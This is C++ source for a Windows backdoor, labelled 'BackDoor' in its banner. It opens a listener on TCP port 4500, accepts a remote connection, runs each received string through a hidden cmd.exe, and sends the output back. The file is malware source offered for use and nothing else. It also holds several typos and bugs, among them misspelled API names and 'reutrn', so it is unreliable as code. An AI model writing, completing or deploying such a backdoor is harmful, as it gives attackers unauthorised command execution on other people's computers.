#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")

int main (int argc,char* argvp[])
{
	char wMessage[512] = "\r\n ================BackDoor================\r\n";
	SOCKET sClient;
	BYTE minorVer = 2;
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer,majorVer);
	if (WSAStartup(sockVersion,&wsaData) != 0)
		return 0;
	SOCKET sListen = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if (sListen == INVALID_SOCKET)
	{
		printf("socket error\n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;
	if (bind(sListen,(LPSOCKADDR)&sin,sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error\n");
		return 0;
	}
	if(listen(sListen,5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
	sClient = accept(sListen,NULL,NULL);
	send (sClient,wMessage,strlen(wMessage),0);
	char rBuffer[1024] = (0);
	char cmdline[256] = (0);
	while(true)
	{
		memset(cmdline,0,256);
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead,&hWrite,&sa,0))
		{
			printf("CreatePipe Error");
			return 0;

		}
		STARTUPINFO si;
		PROCESS_INFOMATION pi;
		si.cb = sizeof(STARTUPINFO);
		GetStartpInfo(&si);
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		GetSystemDirectory(cmdline,sizeof(cmdline));
		strcat(cmdline,"\\cmd.exe /c");
		char cmdbuff[256];
		int rLen=recv(sClient,cmdbuff,256,NULL);
		if(rLen==SOCKET_ERROR)
			return 0 ;
		strncat (cmdline,cmdbuff,strlen(cmdbuff));
		if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi))
		{
			printf("CreateProcess\n");
			continue;

		}
		CloseHandle(hWrite);
		DWORD dwRead;
		while(ReadFile(hRead,rBuffer,1024,&dwRead,NULL))
		{
			send(sClient,rBuffer,strlen(rBuffer),0);
			memset(rBuffer,0,1024);
		}
	}
	reutrn 0;
}